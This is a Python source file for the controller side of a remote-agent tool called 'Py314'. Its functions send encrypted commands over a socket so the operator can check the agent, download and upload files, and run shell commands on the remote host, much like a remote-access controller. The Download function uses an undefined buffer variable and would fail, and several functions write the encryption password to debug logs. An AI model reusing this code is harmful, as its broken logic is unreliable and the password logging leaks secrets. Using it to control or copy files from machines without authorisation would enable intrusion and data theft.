
import os
import logging
import core.crypto as crypto


def Check(channel, password):
    """Perform a remote agent checking"""

    try:

        buffer_size = 1024

        # Get main logger, define in core.logger
        logger = logging.getLogger('main')

        # Define a buffer size
        #bufferSize = BUFFER_SIZE
        # Encrypt 'alive ?' message with symmetric key
        checkMessage = crypto.encrypt_message(password, 'alive ?').encode()
        # Send encrypted message
        channel.sendall(checkMessage)
        # Define rawResponse and a temporary buffer
        rawResponse, tempBuffer = b'', b''

        # While true (while receiving data)
        while True:
            # Temporary buffer receive data
            tempBuffer = channel.recv(buffer_size)
            # Add these data to rawResponse
            rawResponse += tempBuffer
            
            # If data in temporary buffer are smaller than the buffer size, break While loop
            # 'cause, no more data
            if len(tempBuffer) < buffer_size:
                break

        # Decode answer with crypto module
        checkAnswer = crypto.decrypt_message(password, rawResponse.decode())
        # If agent answer is 'alive !', log info 
        if checkAnswer == 'alive !':
            logger.info(f"Agent is alive")

    # ConnectionResetError is raise if channel (socket) is unavailable
    except ConnectionResetError:
        logger.warning(f"Channel reset by peer (broken pipe error)")
        return True

def Download(channel, password, source, destination):
    """Download a file on remote host to a local directory"""

    try:


        buffer_size = 1024

        # Get the main logger, defined in logger module
        logger = logging.getLogger('main')

        # Get ~ directory
        homeFolder = os.environ['HOME']
        # Define Py314 hidden directory
        py314Folder = f"{homeFolder}/.Py314"
        # Define a temporary file
        tempFile = f"{py314Folder}/temp.crypt"
        # Define remote file basename and final decrypted file fullpath
        sourceBasename = os.path.basename(source)
        finalFile = f"{destination}/{sourceBasename}"

        # Some debug
        logger.debug(f"Channel given : {channel}")
        logger.debug(f"Password given : {password}")
        logger.debug(f"Source file given : {source}")
        logger.debug(f"Source file basename : {sourceBasename}")
        logger.debug(f"Destination folder given : {destination}")
        logger.debug(f"Temporary encrypted file : {tempFile}")
        logger.debug(f"Final local file fullpath : {finalFile}")

        # Craft a first message, with source file and destination directory
        message = f"download {source}"
        # Encrypt message with symmetric key
        encryptedMessage = crypto.encrypt_message(password, message)
        # Then, send this first message
        channel.sendall(encryptedMessage.encode())

        #bufferSize = BUFFER_SIZE

        # While True, receive data
        while True:
            logger.debug('Waiting for agent answer about download...')
            agentAnswer = channel.recv(bufferSize)
            if len(agentAnswer) < bufferSize:
                logger.debug('break recv while loop')
                break
        # Decrypt agent answer
        decryptedAnswer = crypto.decrypt_message(password, agentAnswer.decode())
        logger.debug(f"Agent answer : {decryptedAnswer}")

        # If decrypted answer is '!', the remote agent tell that the remote folder doesn't exist
        if decryptedAnswer == '!':
            logger.warning(f"Remote file {source} doesn't exist")

        # Elif agent tell he's ready to send remote file
        elif decryptedAnswer == 'ready':
            
            logger.debug('Agent is ready for file transfer')
            # Open a temporary encrypted file in append binary mode
            with open(tempFile, 'ab') as fileStream:
                # Define a bufferSize and a rawFile content
                rawFile = b''
            
                # While loop to complete socket buffer in recv 
                # If the remote agent needs more data than buffer size, he's will send file in many times
                while True:
                    rawFile = channel.recv(bufferSize)
                    fileStream.write(rawFile)
                    logger.debug(f"Write partial file : {rawFile}")
                    if len(rawFile) < bufferSize:
                        logger.debug('break recv while loop')
                        break
            logger.debug(f"Temporary file successfully written")

            # Decrypt final destination plain file
            crypto.decrypt_file(password, tempFile, finalFile)
            # Remove temporary file
            os.remove(tempFile)
            logger.debug(f"Temporary file {tempFile} deleted")
            logger.info(f"File successfully downloaded to {finalFile}")


    except Exception as error:
        logger.warning('An error occured during downloading file : ')
        logger.warning(error)




def Upload(channel, password, source, destination):
    """Upload a file from a local directory to remote agent"""

    try:
        # Define a buffer size in bytes
        #BUFFER_SIZE = 4096
        buffer_size = 2048

        # Get the main logger, defined in logger module
        logger = logging.getLogger('main')

        # Some debug
        logger.debug(f"Channel given : {channel}")
        logger.debug(f"Password given : {password}")
        logger.debug(f"Source file given : {source}")
        logger.debug(f"Basename of given file : {os.path.basename(source)}")
        logger.debug(f"Destination folder given : {destination}")

        # Get ~ directory
        homeFolder = os.environ['HOME']
        # Define Py314 hidden directory
        py314Folder = f"{homeFolder}/.Py314"
        # Define a temporary file
        tempFile = f"{py314Folder}/temp.crypt"
        # Some debug here
        logger.debug(f"Temporary encrypted file : {tempFile}")
        # Encrypt file and get him size file in bytes
        crypto.encrypt_file(password, source, tempFile)
        nbBytes = os.path.getsize(tempFile)

        
        # Craft a first message, with source file and destination directory
        message = f"upload {source} {destination} {nbBytes}"
        # Encrypt message with symmetric key
        encryptedMessage = crypto.encrypt_message(password, message)
        # Then, send this first message
        channel.sendall(encryptedMessage.encode())
    
        # Define a empty agentAnswer and a buffer size
        agentAnswer= b''

        # While True, receive data
        while True:
            logger.debug('Waiting for agent answer about transfer...')
            agentAnswer = channel.recv(buffer_size)
            if len(agentAnswer) < buffer_size:
                logger.debug('break recv while loop')
                break
        # Decrypt agent answer
        decryptedAnswer = crypto.decrypt_message(password, agentAnswer.decode())
        logger.debug(f"Agent answer : {decryptedAnswer}")

        # If agent's answer is '!', the remote directory doesn't exist
        if decryptedAnswer == '!':
            logger.warning(f"Remote directory {destination} doesn't exist")
            os.remove(tempFile)

        # Else if agent say 'ready', continue the upload request
        elif decryptedAnswer == 'ready':
            logger.debug('Agent is ready for file transfer')
            # Encrypt file with crypto module


            # With statement to open file in Read Binary mode
            with open(tempFile, 'rb') as fileStream:
                binaryData = fileStream.read()
                channel.send(binaryData)
                #logger.debug(f"Partial file sended ({len(binaryData)} bytes) : {binaryData}")


                    

            """
            # Assign data to var
            binaryData = fileStream.read(buffer_size)
            while binaryData:

                channel.send(binaryData)
                logger.debug(f"Partial file sended ({len(binaryData)} bytes) : {binaryData}")
                binaryData = fileStream.read(buffer_size)
            """
                
            #channel.sendall(binaryData)


            # Send binary data through socket
            #channel.send(binaryData)        
            # Send all data through channel
            #logger.debug(f"Binary data from {source} : {binaryData}")
        
            """
            channel.sendall(binaryData)
            """
            # Finally remove temporary encrypted file
            os.remove(tempFile)
            logger.debug(f"File {tempFile} removed")
            logger.info(f"File {source} successfully uploaded")
            

    except Exception as error:
        logger.warning('An error occured during sending file : ')
        logger.warning(error)
        
    
def Shell(channel, password, command):
    """Try to interact with remote agent with a shell"""
# Module to send a shell command to remote agent

    buffer_size = 1024

    logger = logging.getLogger('main')

    logger.debug(f"Channel given : {channel}")
    logger.debug(f"Password given : {password}")

    # Define a buffer size, 1024 bytes
    #bufferSize = BUFFER_SIZE

    if command == b'':
        pass
    else:
        # Else, send command to remote agent
        command = crypto.encrypt_message(password, command)
        channel.sendall(command.encode())

        rawResponse, tempBuffer = b'', b''
        # While True, receive data
        while True:
            logger.debug('recv from socket...')

            tempBuffer = channel.recv(buffer_size)
            rawResponse += tempBuffer
            
            logger.debug(f'Partial answer : {rawResponse.decode()}')
            logger.debug(f'Raw answer lengh : {len(rawResponse)}')
            #logger.debug(f'Temporary buffer : {tempBuffer}')
            # If all data are smaller than the buffer size, break While loop
            if len(tempBuffer) < buffer_size:
                logger.debug('break recv while loop')
                break
            
        # Decode bytes to string to read the answer of the remote agent
        shellReponseEncrypted = rawResponse.decode()
        shellResponse = crypto.decrypt_message(password, shellReponseEncrypted)

        # Print agent's answer
        print(shellResponse)

